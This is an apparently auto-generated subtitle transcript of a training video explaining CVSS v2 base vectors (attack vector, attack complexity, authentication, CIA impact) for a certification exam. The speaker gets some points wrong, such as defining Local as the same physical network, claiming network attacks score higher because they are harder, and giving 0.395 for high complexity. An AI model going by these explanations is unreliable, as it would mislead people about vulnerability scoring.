00:01:59.750\nthat whole scap thing we discussed before,\n\n53\n00:01:59.750 --> 00:02:05.240\nthat's what's being used to create\nthe information inside of the CVSS.\n\n54\n00:02:05.240 --> 00:02:08.950\nIt's kind of like the over\narching guidelines so\n\n55\n00:02:08.950 --> 00:02:11.730\nthat you can have the guidelines\nwithin the guidelines.\n\n56\n00:02:11.730 --> 00:02:17.310\n&gt;&gt; Right, that's the SCAP, then there's\nCVSS, which is the subset of SCAP, right?\n\n57\n00:02:17.310 --> 00:02:18.440\n&gt;&gt; It's priorities.\n\n58\n00:02:18.440 --> 00:02:20.500\n&gt;&gt; Yeah.\n&gt;&gt; What's more severe or less severe,\n\n59\n00:02:20.500 --> 00:02:21.190\nthat kind of thing.\n\n60\n00:02:21.190 --> 00:02:21.850\n&gt;&gt; Nailed it!\n\n61\n00:02:21.850 --> 00:02:22.910\n&gt;&gt; Okay.\n&gt;&gt; Nailed it perfectly,\n\n62\n00:02:22.910 --> 00:02:24.010\nthat's exactly right.\n\n63\n00:02:24.010 --> 00:02:27.790\nHow do I say that this vulnerability\nis more dangerous to me\n\n64\n00:02:27.790 --> 00:02:28.800\nthan that vulnerability?\n\n65\n00:02:28.800 --> 00:02:32.060\nIf I just had a vulnerability scanner and\nI hit go and it comes back and says,\n\n66\n00:02:32.060 --> 00:02:33.790\nhere's your vulnerabilities, great.\n\n67\n00:02:33.790 --> 00:02:35.270\nWhich one do I start with?\n\n68\n00:02:35.270 --> 00:02:36.890\nHow do I prioritize these things?\n\n69\n00:02:36.890 --> 00:02:40.300\nI mean, it's just a big old mess of vulns.\n\n70\n00:02:40.300 --> 00:02:41.310\nWhat do I do, right?\n\n71\n00:02:41.310 --> 00:02:47.230\nSo using CVSS, and most vulnerability\nscanners do employ CVSS.\n\n72\n00:02:47.230 --> 00:02:52.230\nSo you'll be able to get a score and\nprioritize and say well these are my most\n\n73\n00:02:52.230 --> 00:02:57.640\ndangerous items that I probably\nneed to address first.\n\n74\n00:02:57.640 --> 00:03:00.910\nAnd that CVSS has helped\nus with figuring that out.\n\n75\n00:03:00.910 --> 00:03:02.730\nSo that's the purpose of it.\n\n76\n00:03:02.730 --> 00:03:06.010\nAnd not only that but to give us\na little bit of information about these\n\n77\n00:03:06.010 --> 00:03:07.490\ndifferent vulnerabilities as well.\n\n78\n00:03:07.490 --> 00:03:14.820\nWe can discern a lot from what we\nsee in the CVSS output that we get.\n\n79\n00:03:14.820 --> 00:03:16.780\n&gt;&gt; And we're looking at version two,\nis that right, Daniel?\n\n80\n00:03:16.780 --> 00:03:21.320\n&gt;&gt; That's correct, so\nmost people are still using version two.\n\n81\n00:03:21.320 --> 00:03:26.090\nThere is also a version three, which is\nthe latest and it's picking up steam.\n\n82\n00:03:26.090 --> 00:03:31.830\nBecause it tries to address some of\nthe perceived weaknesses of version two.\n\n83\n00:03:31.830 --> 00:03:35.460\nBut version two is probably still\nthe most common that you're gonna see and\n\n84\n00:03:35.460 --> 00:03:38.930\nI think it is the version that\nis called out on the exam.\n\n85\n00:03:38.930 --> 00:03:42.180\nDo look at version three though once\nwe get done looking at version two and\n\n86\n00:03:42.180 --> 00:03:44.000\nyou get a good grasp on what's happening,\n\n87\n00:03:44.000 --> 00:03:46.250\ncuz that's gonna help you\nunderstand version three better.\n\n88\n00:03:46.250 --> 00:03:52.150\nNot a ton of changes, but\nsome some just different ways in which\n\n89\n00:03:52.150 --> 00:03:56.460\nthey take the same information and just\ncategorize it a little bit differently,\n\n90\n00:03:56.460 --> 00:03:58.390\ngive a little bit of a different label.\n\n91\n00:03:58.390 --> 00:04:01.490\nSo understanding version two is going\nto help you understand version three so\n\n92\n00:04:01.490 --> 00:04:05.540\ni recommend learning it first and\nthat's what we're going to do today.\n\n93\n00:04:05.540 --> 00:04:10.640\nalright so\nlet's take a look at one of these weird\n\n94\n00:04:10.640 --> 00:04:15.800\nlittle things and you're gonna be like wow\nthat's an interesting thing you got there.\n\n95\n00:04:15.800 --> 00:04:17.690\nAnd i can't describe it,\n\n96\n00:04:17.690 --> 00:04:20.370\nI just have to show it to you,\nlet's jump into the computer.\n\n97\n00:04:20.370 --> 00:04:22.560\nI've got open bonds open and\n\n98\n00:04:22.560 --> 00:04:27.670\nwe're gonna look at a vulnerability\nscan report that has already been done.\n\n99\n00:04:27.670 --> 00:04:32.190\nAnd i'm going to look at vulnerability and\nit's going to have And the information\n\n100\n00:04:32.190 --> 00:04:35.300\nalong with it there at the-\n&gt;&gt; Open Box is great.\n\n101\n00:04:35.300 --> 00:04:36.460\n&gt;&gt; Yeah I love Open Box.\n\n102\n00:04:36.460 --> 00:04:38.270\nDon't worry about the fact\nthat it's super tiny,\n\n103\n00:04:38.270 --> 00:04:41.110\nonce we get to where we're going,\nI'll zoom in, okay.\n\n104\n00:04:41.110 --> 00:04:44.070\nNow let's go to results.\n\n105\n00:04:45.730 --> 00:04:49.450\nI don't think I clicked on that correctly\nbecause I go crazy with my trackpad.\n\n106\n00:04:49.450 --> 00:04:53.000\nThere we go, let's click results.\n\n107\n00:04:53.000 --> 00:04:53.710\nAll right, so\n\n108\n00:04:53.710 --> 00:04:59.500\nhere is S Estates Brute Force logins with\ndefault credentials reporting, okay?\n\n109\n00:04:59.500 --> 00:05:05.790\nSo we see over here we have\nthe severity is 7.5, and it says, high.\n\n110\n00:05:05.790 --> 00:05:09.440\nThat is the CVSS base score.\n\n111\n00:05:09.440 --> 00:05:13.870\nThis is the overall score after\nculminating all the different little\n\n112\n00:05:13.870 --> 00:05:18.500\nscores that goes along with the CVSS,\nwhich we're going to see in just a second.\n\n113\n00:05:18.500 --> 00:05:21.900\nWe run it through this\nmathematical computation and\n\n114\n00:05:21.900 --> 00:05:23.600\nthat gives us our base score.\n\n115\n00:05:23.600 --> 00:05:29.540\nSo that's what we typically see,\ngiving you the overall how severe\n\n116\n00:05:29.540 --> 00:05:32.860\nis this vulnerability to my network,\nso that's what we're going to see.\n\n117\n00:05:32.860 --> 00:05:34.550\nAnd we're going to look at how\nto calculate base scores but\n\n118\n00:05:34.550 --> 00:05:35.440\nwe're not going to do that right now.\n\n119\n00:05:35.440 --> 00:05:38.900\nWe've got to understand some Some back\nstory first before we get that far but\n\n120\n00:05:38.900 --> 00:05:40.625\nwe will get to that.\n\n121\n00:05:40.625 --> 00:05:42.290\n&gt;&gt; 7.5, that's pretty high, yeah?\n\n122\n00:05:42.290 --> 00:05:44.000\nAnd does it go as high as ten?\n\n123\n00:05:44.000 --> 00:05:47.170\n&gt;&gt; Yes, it goes from like zero to ten.\n\n124\n00:05:47.170 --> 00:05:47.880\n&gt;&gt; Okay.\n&gt;&gt; Right,\n\n125\n00:05:47.880 --> 00:05:50.590\nand having variations in between.\n\n126\n00:05:50.590 --> 00:05:51.160\n&gt;&gt; There you go.\n\n127\n00:05:51.160 --> 00:05:53.980\n&gt;&gt; All right, so let's look at this.\n\n128\n00:05:53.980 --> 00:06:00.640\nAnd if I actually click on,\ndoes this have one on there?\n\n129\n00:06:00.640 --> 00:06:02.700\nMaybe it doesn't,\ncuz it was a brute force.\n\n130\n00:06:02.700 --> 00:06:06.620\nLet's go here.\nI think it should have it, though.\n\n131\n00:06:07.630 --> 00:06:08.260\nLet's do this one.\n\n132\n00:06:10.260 --> 00:06:11.560\nThis just gives the information.\n\n133\n00:06:11.560 --> 00:06:15.220\nIf I click here, all right, so\nhere's what we're looking for.\n\n134\n00:06:15.220 --> 00:06:16.930\nI'm gonna show it to you here.\n\n135\n00:06:17.950 --> 00:06:19.460\nSo vulnerability scoring.\n\n136\n00:06:19.460 --> 00:06:24.300\nYou'll notice CVSS basis 10.0,\nwhich means ooh, it's critical.\n\n137\n00:06:24.300 --> 00:06:24.858\nThis is bad.\n\n138\n00:06:24.858 --> 00:06:27.640\n&gt;&gt; Yeah.\n&gt;&gt; This is something you definitely want\n\n139\n00:06:27.640 --> 00:06:29.920\nto prioritize to the top of the list.\n\n140\n00:06:29.920 --> 00:06:33.560\nBut then you'll see this\nCVSS base-vector area.\n\n141\n00:06:33.560 --> 00:06:36.880\nRight and why don't you go ahead and,\nI don't know,\n\n142\n00:06:36.880 --> 00:06:39.570\ncan you see that there very well,\nMr. Zach?\n\n143\n00:06:39.570 --> 00:06:41.180\n&gt;&gt; Yes sir, I can read that.\n\n144\n00:06:41.180 --> 00:06:42.215\n&gt;&gt; Can you interpret that for me?\n\n145\n00:06:42.215 --> 00:06:45.041\n&gt;&gt; It means-\n&gt;&gt; [LAUGH]\n\n146\n00:06:45.041 --> 00:06:47.580\n&gt;&gt; It's a [LAUGH] Critical base vector.\n\n147\n00:06:47.580 --> 00:06:49.610\n&gt;&gt; There you go,\nhe's dead on the money, right?\n\n148\n00:06:49.610 --> 00:06:52.050\nAnd if you've never seen this before,\nyou probably look at this going,\n\n149\n00:06:52.050 --> 00:06:54.850\nwhat is all this Greek business?\n\n150\n00:06:54.850 --> 00:06:56.340\n&gt;&gt; Yeah, a lot of alphabet soup.\n\n151\n00:06:56.340 --> 00:06:59.130\n&gt;&gt; Yeah, it's alphabet soup,\nit doesn't mean a whole lot to us.\n\n152\n00:06:59.130 --> 00:07:00.160\nBut it does mean something,\n\n153\n00:07:00.160 --> 00:07:05.050\nthis, all these base vectors are how\nwe calculate the base score.\n\n154\n00:07:05.050 --> 00:07:05.980\n&gt;&gt; Okay?\n&gt;&gt; Mm-hm.\n\n155\n00:07:05.980 --> 00:07:10.450\n&gt;&gt; So we have to know what each one of the\nvectors are, each one of their different\n\n156\n00:07:11.760 --> 00:07:17.310\nattributes, because you'll notice, this\nis basically separated by forward slash.\n\n157\n00:07:17.310 --> 00:07:22.240\nSo, I think that's what part of makes\nthis thing a little bit confusing.\n\n158\n00:07:22.240 --> 00:07:24.380\nAs there are colons and\nthere are forward slashes.\n\n159\n00:07:24.380 --> 00:07:28.520\nAnd you're saying,\nwhich one do I delineate with?\n\n160\n00:07:28.520 --> 00:07:31.500\nWhich one is my actual, like separator?\n\n161\n00:07:32.770 --> 00:07:34.960\nWell they're both separators,\nbut in a certain way.\n\n162\n00:07:34.960 --> 00:07:37.030\nOne does one separation,\nand the other does another.\n\n163\n00:07:37.030 --> 00:07:42.710\nSo the colon is a separator between\nthis vector and it's attribute, right?\n\n164\n00:07:42.710 --> 00:07:45.660\nAnd then, the forward slash says,\nI'm going into another vector.\n\n165\n00:07:45.660 --> 00:07:50.040\nI'm separating vectors out\nfrom each other, okay?\n\n166\n00:07:50.040 --> 00:07:52.130\nSo if you see the forward slash,\n\n167\n00:07:52.130 --> 00:07:55.620\nbehind the forward slash is\ngonna be the next vector.\n\n168\n00:07:55.620 --> 00:07:59.088\nIf it's a colon behind that,\nit's going to be attribute of a vector.\n\n169\n00:07:59.088 --> 00:08:00.000\nOkay?\n&gt;&gt; Mm-hm.\n\n170\n00:08:00.000 --> 00:08:00.793\n&gt;&gt; Hopefully that makes sense.\n\n171\n00:08:00.793 --> 00:08:01.578\n&gt;&gt; That makes sense.\n\n172\n00:08:01.578 --> 00:08:04.169\n&gt;&gt; We're gonna be able to walk\nthrough these and these are these, or\n\n173\n00:08:04.169 --> 00:08:04.790\nisn't it six?\n\n174\n00:08:04.790 --> 00:08:06.800\nOne, two, three, four, five, six, yeah.\n\n175\n00:08:06.800 --> 00:08:10.250\nThese are the six different vectors that\nwe need to be able to score with and\n\n176\n00:08:10.250 --> 00:08:11.760\nunderstand the attributes of.\n\n177\n00:08:11.760 --> 00:08:15.200\nSo that we are able to properly\nunderstand, analyze and\n\n178\n00:08:15.200 --> 00:08:18.420\ncalculate our CVSS base score.\n\n179\n00:08:18.420 --> 00:08:20.762\n&gt;&gt; And we might see this on the exam too,\nright?\n\n180\n00:08:20.762 --> 00:08:25.540\n&gt;&gt; I'm gonna go with, you are almost\npositive to see this on the exam.\n\n181\n00:08:25.540 --> 00:08:26.460\nAt least in some way.\n\n182\n00:08:26.460 --> 00:08:28.401\nMaybe not deep down into the bowels of it.\n\n183\n00:08:28.401 --> 00:08:32.150\nBut, and they might ask you\nwhat CVSS stands for, right.\n\n184\n00:08:32.150 --> 00:08:35.606\nOr hey, if you wanted to understand,\n\n185\n00:08:35.606 --> 00:08:40.250\ngive a quantitative analysis\nof a vulnerability,\n\n186\n00:08:40.250 --> 00:08:44.138\nwhich on of these would you use,\nA B C D, and\n\n187\n00:08:44.138 --> 00:08:49.756\nCVSS would be one of them, and\nyou would choose that, right.\n\n188\n00:08:49.756 --> 00:08:53.480\nSo that might be the only thing you\nneed to know about, but they might say,\n\n189\n00:08:53.480 --> 00:08:56.285\ncalculate this base score\nbased off of these metrics.\n\n190\n00:08:56.285 --> 00:08:57.980\n&gt;&gt; Mm-hm.\n&gt;&gt; You're like okay, yeah,\n\n191\n00:08:57.980 --> 00:08:58.910\nthis just got real.\n\n192\n00:08:58.910 --> 00:09:00.920\n&gt;&gt; And\nwhat do these vectors represent as well?\n\n193\n00:09:00.920 --> 00:09:04.910\n&gt;&gt; Right, so you might be, and ask\nquestions on any of that kind of thing.\n\n194\n00:09:04.910 --> 00:09:07.868\nSo we're just gonna throw it all at\nyou and let you understand it and,\n\n195\n00:09:07.868 --> 00:09:11.132\nI'm almost positive it gonna take us\na couple of episodes to get through just\n\n196\n00:09:11.132 --> 00:09:12.869\nbecause there is a lot that goes on here.\n\n197\n00:09:12.869 --> 00:09:17.907\nI wanna make sure you guys understand so\nthat you're very equipped to handle any\n\n198\n00:09:17.907 --> 00:09:22.958\nof these questions that anyone regardless\nof where it may be might throw at you.\n\n199\n00:09:22.958 --> 00:09:25.302\n&gt;&gt; Thank you Gail.\n\n200\n00:09:25.302 --> 00:09:28.950\n&gt;&gt; That's what I do\n&gt;&gt; Now that we've seen what that looks\n\n201\n00:09:28.950 --> 00:09:31.010\nlike, let's break it down.\n\n202\n00:09:31.010 --> 00:09:31.900\nLet's take a look at that.\n\n203\n00:09:31.900 --> 00:09:32.640\nI'm gonna come over here.\n\n204\n00:09:32.640 --> 00:09:37.000\nI have CVSS overview, and here we go.\n\n205\n00:09:37.000 --> 00:09:38.310\nI even color coded it for us.\n\n206\n00:09:38.310 --> 00:09:42.430\nLook at me, it looks like a rainbow\nthrew up on my screen, but here we go.\n\n207\n00:09:43.550 --> 00:09:44.690\nWhat are we looking at?\n\n208\n00:09:44.690 --> 00:09:48.060\nSo AV is the Attack Vector.\n\n209\n00:09:49.230 --> 00:09:51.416\nMakes sense.\n&gt;&gt; Okay, how am I being attacked,\n\n210\n00:09:51.416 --> 00:09:55.708\nin what way, and there's actually\nwe'll get to that in a second.\n\n211\n00:09:55.708 --> 00:10:01.830\nAC, attack complexity, how complex is it\nfor us to actually launch said attack?\n\n212\n00:10:01.830 --> 00:10:05.290\nDoes it take a lot of skill and\nsuper intelligent minds, or\n\n213\n00:10:05.290 --> 00:10:10.790\ncan any old script kiddy chuck\nsomething at it and make it happen.\n\n214\n00:10:10.790 --> 00:10:14.510\nAU is authentication,\nunless it's a lower case u,\n\n215\n00:10:14.510 --> 00:10:16.670\nthat's the proper nomenclature, but\n\n216\n00:10:16.670 --> 00:10:22.100\nI would assume if you saw Au in any form,\nunless they were juxtaposed to each other.\n\n217\n00:10:22.100 --> 00:10:25.640\nIs it capital A, capital U,\nor Capital A, lower case U?\n\n218\n00:10:25.640 --> 00:10:27.900\nAsk you that is lower case u.\n\n219\n00:10:27.900 --> 00:10:30.918\nOkay, but if you just see Au\nthat would be your answer.\n\n220\n00:10:30.918 --> 00:10:33.762\n&gt;&gt; Mm-hm.\n&gt;&gt; If it was a question, that way.\n\n221\n00:10:33.762 --> 00:10:36.623\nSo Authentication, how many times must one\n\n222\n00:10:36.623 --> 00:10:41.354\nauthenticate to actually perform\nsaid attack against vulnerability?\n\n223\n00:10:41.354 --> 00:10:44.790\n&gt;&gt; 42\n&gt;&gt; Yes, maybe, who knows, we're gonna see.\n\n224\n00:10:46.090 --> 00:10:49.310\nThen we get into these three here,\nC, I, and A.\n\n225\n00:10:49.310 --> 00:10:53.270\nHopefully, that is ringing bells,\nding, ding, ding, ding,\n\n226\n00:10:53.270 --> 00:10:54.280\nright in the mind, right.\n\n227\n00:10:54.280 --> 00:10:59.390\nThe old confidentiality, integrity,\nand availability vectors.\n\n228\n00:10:59.390 --> 00:11:04.980\nSo, has any of these been breached,\nand if so, to what extent?\n\n229\n00:11:04.980 --> 00:11:08.118\nRight, and that's gonna be the attributes,\nokay, right?\n\n230\n00:11:08.118 --> 00:11:12.380\nSo these are, hammer these in your brain,\nthis will be available as part of the show\n\n231\n00:11:12.380 --> 00:11:16.530\nnotes, the files, so all these lovely\nlittle graphs I've made for you guys.\n\n232\n00:11:16.530 --> 00:11:19.380\nSo you don't have to write it down,\nbut if you're that kind of learner,\n\n233\n00:11:19.380 --> 00:11:21.936\nthen write it down a million times\nuntil it's hammered into your head.\n\n234\n00:11:21.936 --> 00:11:23.670\n&gt;&gt; Mm-hm.\n&gt;&gt; All right, so let's get out of here.\n\n235\n00:11:23.670 --> 00:11:28.440\nNow that we know what each one of these\nare, let's break that down even further.\n\n236\n00:11:28.440 --> 00:11:29.560\nAll right, so let's go in here.\n\n237\n00:11:29.560 --> 00:11:30.480\nI'm gonna close this one.\n\n238\n00:11:32.110 --> 00:11:36.160\nLet's start with AV, the access vector.\n\n239\n00:11:36.160 --> 00:11:39.740\nGet that nice and big.\n\n240\n00:11:39.740 --> 00:11:40.828\nEveryone can see.\n\n241\n00:11:40.828 --> 00:11:41.350\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n242\n00:11:41.350 --> 00:11:45.490\nyou'll notice that there\nare three attributes to this.\n\n243\n00:11:45.490 --> 00:11:49.370\nIt is Local, Adjacent, and Network.\n\n244\n00:11:49.370 --> 00:11:51.780\nSo, what does Local mean?\n\n245\n00:11:51.780 --> 00:11:58.230\nLocal means that the attacker must be on\nthe same physical network as the machine\n\n246\n00:11:58.230 --> 00:12:05.480\nbeing attacked, to successfully perform\nthe exploitative vulnerability, okay?\n\n247\n00:12:05.480 --> 00:12:08.970\nThat is the case,\nthen the score that you will garner.\n\n248\n00:12:08.970 --> 00:12:13.760\nSo if you see that, if you see AV:L,\nthat means it is a local attack.\n\n249\n00:12:13.760 --> 00:12:19.420\nIt means someone must be on the local\nnetwork to successfully exploit it.\n\n250\n00:12:19.420 --> 00:12:23.543\nAnd you will garner a score of 0.395.\n\n251\n00:12:23.543 --> 00:12:30.510\nI have no idea why these scores\nare the way they are, all right?\n\n252\n00:12:30.510 --> 00:12:32.752\nAnd just a,\nI also want to help you out with this, so\n\n253\n00:12:32.752 --> 00:12:35.540\njust remember to have\nthis website pulled up.\n\n254\n00:12:35.540 --> 00:12:39.380\nRight here, this web link will\nbe in the show notes, but,\n\n255\n00:12:39.380 --> 00:12:45.010\nhere is the CVSS, A Complete Guide to\nthe Common Vulnerability Scoring System.\n\n256\n00:12:45.010 --> 00:12:51.320\nI would take the time to peruse this\ndocument is very, very in depth.\n\n257\n00:12:51.320 --> 00:12:53.140\nIt is also, is very detailed.\n\n258\n00:12:53.140 --> 00:12:58.492\nSo it's gonna give you every nuance\nto how the 2.0 scoring system works.\n\n259\n00:12:58.492 --> 00:13:00.450\nAs what I'm just giving you the quick and\ndirty.\n\n260\n00:13:00.450 --> 00:13:04.573\nRight, so this is going to be the more\nin-depth scholarly work that you\n\n261\n00:13:04.573 --> 00:13:06.430\nmight want to take a look at.\n\n262\n00:13:06.430 --> 00:13:09.745\nAnd have at least as\na bookmarked favorite.\n\n263\n00:13:09.745 --> 00:13:10.260\n&gt;&gt; Mm-hm.\n\n264\n00:13:10.260 --> 00:13:13.570\n&gt;&gt; For you in the future when you're\ntrying to discern these things.\n\n265\n00:13:13.570 --> 00:13:16.980\nMaybe just in practice instead of for\nan exam.\n\n266\n00:13:16.980 --> 00:13:20.180\nIt's a really good resource so\nI'll make that available for\n\n267\n00:13:20.180 --> 00:13:22.520\nyou guys and\nthen you can download the PDF right here.\n\n268\n00:13:23.980 --> 00:13:30.480\nSo let's go back where are we at attack\nvector bring it out, here we go.\n\n269\n00:13:30.480 --> 00:13:31.742\nGet this squared away.\n\n270\n00:13:31.742 --> 00:13:35.760\nAll right, so the local, that's the local.\n\n271\n00:13:35.760 --> 00:13:42.430\nLet's see here, also, it could be local\nif they could be logged in remotely.\n\n272\n00:13:42.430 --> 00:13:47.870\nIt is a possibility to get an L score or\nan L attribute for the attack vector,\n\n273\n00:13:47.870 --> 00:13:52.650\nif they have exploited a local login,\nright?\n\n274\n00:13:52.650 --> 00:13:56.800\nSo, if somehow, maybe they have\ndone a remote code execution,\n\n275\n00:13:56.800 --> 00:14:03.780\ngained shell access to the machine but\nthey are logged in as some remote user.\n\n276\n00:14:03.780 --> 00:14:07.630\nIt's not a local user, but once they've\ndone that, once they've done a privilege\n\n277\n00:14:07.630 --> 00:14:11.130\nescalation to the root user or\nsomething to that effect.\n\n278\n00:14:11.130 --> 00:14:16.960\nOr the administrator, like a local\nadministrator but Windows workstation.\n\n279\n00:14:16.960 --> 00:14:19.660\nWhere they log in with a domain\ncredential another log and\n\n280\n00:14:19.660 --> 00:14:23.070\nthey've jumped into the local admin\nusing privilege escalation techniques.\n\n281\n00:14:23.070 --> 00:14:27.950\nThat would be also considered\na local vector, okay?\n\n282\n00:14:27.950 --> 00:14:29.580\nCool, very cool.\n\n283\n00:14:29.580 --> 00:14:33.318\nAll right, Adjacents, what is adjacent?\n\n284\n00:14:33.318 --> 00:14:36.085\nWell, let's use our-\n&gt;&gt; The guy in the next building.\n\n285\n00:14:36.085 --> 00:14:39.320\n&gt;&gt; [LAUGH]\n&gt;&gt; That's basically right, like,\n\n286\n00:14:39.320 --> 00:14:43.770\nthey can get to the vulnerable system\n\n287\n00:14:43.770 --> 00:14:46.550\nthrough a network that is connected to it,\nall right?\n\n288\n00:14:46.550 --> 00:14:50.660\nSo it doesn't have to be\ndirectly connected to it, but\n\n289\n00:14:50.660 --> 00:14:54.160\nthe network must be directly connected\nto the network that the machine is on.\n\n290\n00:14:54.160 --> 00:14:55.705\nI think that's the best way to say it.\n\n291\n00:14:55.705 --> 00:14:59.610\n&gt;&gt; Okay.\n&gt;&gt; What else, Adjacent.\n\n292\n00:14:59.610 --> 00:15:02.890\nAccess to a local network that his\naffected system is connected to.\n\n293\n00:15:02.890 --> 00:15:07.310\nSo as long as there is some tertiary\nnetwork that you can gain access to, and\n\n294\n00:15:07.310 --> 00:15:11.940\nuse that to pivot into\nthe system that you want.\n\n295\n00:15:11.940 --> 00:15:16.680\nThat would be an adjacent, which garners\na score of 0.646, as we can see.\n\n296\n00:15:16.680 --> 00:15:21.797\nAs you can see,\nas we move through how close we are,\n\n297\n00:15:21.797 --> 00:15:26.438\nor how, it really is not so\nmuch how close, but\n\n298\n00:15:26.438 --> 00:15:30.550\nhow difficult it is to get these things.\n\n299\n00:15:30.550 --> 00:15:34.908\nBut if you're a for,\nit's weird to try to terminologize this?\n\n300\n00:15:34.908 --> 00:15:35.930\nTerminologize?\n\n301\n00:15:35.930 --> 00:15:37.177\nI can't think of the word.\n\n302\n00:15:37.177 --> 00:15:37.761\n&gt;&gt; Terminolomony.\n\n303\n00:15:37.761 --> 00:15:38.600\n&gt;&gt; This.\nThere we go.\n\n304\n00:15:38.600 --> 00:15:39.799\nYeah, that word. I like it.\n&gt;&gt; Terminolomony.\n\n305\n00:15:39.799 --> 00:15:40.720\nSee?\nI'm gonna use that.\n\n306\n00:15:40.720 --> 00:15:41.272\nTerminolomony.\n\n307\n00:15:41.272 --> 00:15:42.220\n&gt;&gt; I like it, yeah.\n\n308\n00:15:42.220 --> 00:15:43.255\nThat's what we're going to go with.\n\n309\n00:15:43.255 --> 00:15:47.124\n[LAUGH]\n&gt;&gt; What I'm saying is the closer you are,\n\n310\n00:15:47.124 --> 00:15:50.981\nthe lower the score, the farther\naway you are, the higher the score.\n\n311\n00:15:50.981 --> 00:15:53.740\nSo just keep that in mind,\nthat's what you wanna remember.\n\n312\n00:15:53.740 --> 00:15:56.499\nAnd if you can remember the scores,\nagain, bing, bing, bing, bing,\n\n313\n00:15:56.499 --> 00:15:57.370\nflashcard material.\n\n314\n00:15:57.370 --> 00:15:59.943\nAnyone, this would be\nsomething you'd wanna look at.\n\n315\n00:15:59.943 --> 00:16:05.970\n&gt;&gt; So a question I have is, you'd think\nthat a local would be higher priority,\n\n316\n00:16:05.970 --> 00:16:09.940\nthat would have more of\na priority than a network.\n\n317\n00:16:09.940 --> 00:16:10.930\n&gt;&gt; You would think that, right?\n\n318\n00:16:10.930 --> 00:16:16.513\nAnd that logic seems right, like,\nI've gained access to their local, yeah.\n\n319\n00:16:16.513 --> 00:16:18.812\nBut this is probably like an inside,\n\n320\n00:16:18.812 --> 00:16:22.010\nthis is somebody that works\non that local network.\n\n321\n00:16:22.010 --> 00:16:22.810\n&gt;&gt; Yeah.\n\n322\n00:16:22.810 --> 00:16:24.070\n&gt;&gt; So that they have access to it.\n\n323\n00:16:24.070 --> 00:16:25.970\nIf it's for an outsider,\nyeah it would be harder,\n\n324\n00:16:25.970 --> 00:16:28.910\nbut there's a lot of\nways to get into a local.\n\n325\n00:16:28.910 --> 00:16:36.270\nBut for me to be able to exploit a machine\nfrom the Internet, is much more difficult.\n\n326\n00:16:36.270 --> 00:16:37.965\nRight, because of the access that I have.\n\n327\n00:16:37.965 --> 00:16:40.510\nGaining access to a local network\nisn't really that difficult,\n\n328\n00:16:40.510 --> 00:16:43.480\nespecially with\nthe proliferation of wireless.\n\n329\n00:16:43.480 --> 00:16:47.290\nAnd then you might even get like adjacent,\nbecause maybe they'll have a guest\n\n330\n00:16:47.290 --> 00:16:49.666\nwireless network that\neveryone can connect to.\n\n331\n00:16:49.666 --> 00:16:52.789\nAnd you're gonna use that because it's\nconnected to the actual network you\n\n332\n00:16:52.789 --> 00:16:55.450\nwant to attack, so\nyou're gonna pivot through there.\n\n333\n00:16:55.450 --> 00:16:57.320\nSo the more separate you are,\n\n334\n00:16:57.320 --> 00:17:00.170\nthe more difficult it is,\ntherefore the more higher the score.\n\n335\n00:17:00.170 --> 00:17:03.700\nThe higher score means that you're\nworking with a really skilled attacker,\n\n336\n00:17:03.700 --> 00:17:08.102\nwith a really devastating exploit,\nhence the higher score.\n\n337\n00:17:08.102 --> 00:17:10.240\n&gt;&gt; So with the network access vector,\n\n338\n00:17:10.240 --> 00:17:12.810\nthat's gonna be a separate network\nentirely than someone who's\n\n339\n00:17:12.810 --> 00:17:15.102\nhacked into our network from\na separate network, is that right?\n\n340\n00:17:15.102 --> 00:17:21.627\n&gt;&gt; That is absolutely correct,\nthis is accessing the target network and\n\n341\n00:17:21.627 --> 00:17:26.836\ntarget machine by means of\nthe OSI layer three or above.\n\n342\n00:17:26.836 --> 00:17:30.220\nOkay, so you should understand that,\nI shouldn't have to explain to you.\n\n343\n00:17:30.220 --> 00:17:34.440\nWe're going from layer three,\nfour, five, six and seven.\n\n344\n00:17:34.440 --> 00:17:39.660\nSo what is that,\nInternet through application, right?\n\n345\n00:17:39.660 --> 00:17:41.635\nAnyone of these things\nthat you can work through.\n\n346\n00:17:41.635 --> 00:17:44.700\nSo this could be a web app\nthat you're doing it with, or\n\n347\n00:17:44.700 --> 00:17:49.183\ndirect remote network connection through\nthe Internet, something like SSH.\n\n348\n00:17:49.183 --> 00:17:53.250\nRight, that would be a network vector,\nwould be considered N.\n\n349\n00:17:53.250 --> 00:17:55.820\nRight, and\nit garners the highest score of 1.0.\n\n350\n00:17:55.820 --> 00:17:58.100\nAnd I think it's the highest\nscore I've seen, maybe not,\n\n351\n00:17:58.100 --> 00:18:00.120\nthere might be higher ones,\nbut it's pretty high.\n\n352\n00:18:00.120 --> 00:18:02.290\n&gt;&gt; Pretty high.\n&gt;&gt; That's pretty high, that's a bad thing.\n\n353\n00:18:02.290 --> 00:18:05.690\nSo we wanna avoid these network\nattacks as much as possible.\n\n354\n00:18:05.690 --> 00:18:07.362\nSo that's why we get the higher score.\n\n355\n00:18:07.362 --> 00:18:12.830\nAll right, so now we hopefully understand\nthe attack vector, what that means.\n\n356\n00:18:12.830 --> 00:18:18.238\nIf you see L it's local, A adjacent,\nand N is network attack, right?\n\n357\n00:18:18.238 --> 00:18:22.711\nLet's zoom in, let's move on,\nclose that out.\n\n358\n00:18:22.711 --> 00:18:28.470\nLet's go to AC, which is the access,\nI'm sorry attack complexity.\n\n359\n00:18:28.470 --> 00:18:30.740\nGet that aligned, there we go.\n\n360\n00:18:30.740 --> 00:18:35.530\nAnd this is basically\nhow difficult is it for\n\n361\n00:18:35.530 --> 00:18:41.300\nsomeone to successfully pull off\nan exploit of a found vulnerability?\n\n362\n00:18:41.300 --> 00:18:44.180\nThat's what we're talking about,\nhow difficult is that?\n\n363\n00:18:44.180 --> 00:18:46.740\nAnd high, medium, low,\nit's very self explanatory,\n\n364\n00:18:46.740 --> 00:18:48.030\nI love these self explanatory ones.\n\n365\n00:18:48.030 --> 00:18:48.890\nYou guys know how it is,\n\n366\n00:18:48.890 --> 00:18:53.130\nit just makes it so easy for all of us\nto understand what the heck is going on.\n\n367\n00:18:53.130 --> 00:18:56.549\nWhy make it more difficult than it\nneeds to be to be honest with you,\n\n368\n00:18:56.549 --> 00:18:59.872\nsecurity's hard enough without\nthem adding complexity to it.\n\n369\n00:18:59.872 --> 00:19:03.374\nThey should do security\ncomplexity understanding, right?\n\n370\n00:19:03.374 --> 00:19:07.770\n&gt;&gt; [LAUGH]\n&gt;&gt; Very high, critical, difficult, right?\n\n371\n00:19:07.770 --> 00:19:12.244\nBut anyway, high will give you an H,\nmedium M, L for low, and\n\n372\n00:19:12.244 --> 00:19:17.084\nthe score are appropriate here,\nwe've got 0.395 for high.\n\n373\n00:19:19.428 